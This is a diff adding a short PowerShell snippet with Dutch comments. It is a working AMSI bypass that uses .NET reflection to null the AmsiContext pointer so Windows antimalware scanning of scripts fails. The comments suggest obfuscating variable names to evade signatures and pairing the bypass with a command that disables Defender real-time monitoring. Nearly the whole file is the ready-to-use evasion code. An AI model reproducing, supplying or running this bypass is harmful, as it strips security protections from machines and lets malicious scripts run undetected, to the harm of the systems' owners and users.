@@ -1,0 +1,7 @@
+# AMSI Bypass via .NET Reflection - AmsiContext null pointer
+# Zet AmsiContext naar 0 via reflection, waardoor AmsiScanBuffer faalt
+# Werkt in PowerShell 5.1+ (pre-Win11)
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+# Test: amsiutils (zou geen detectie moeten triggeren)
+# Tip: Obfuscate variabele namen als signature gedetecteerd wordt
+# Tip: Combineer met Set-MpPreference -DisableRealtimeMonitoring $true (admin)
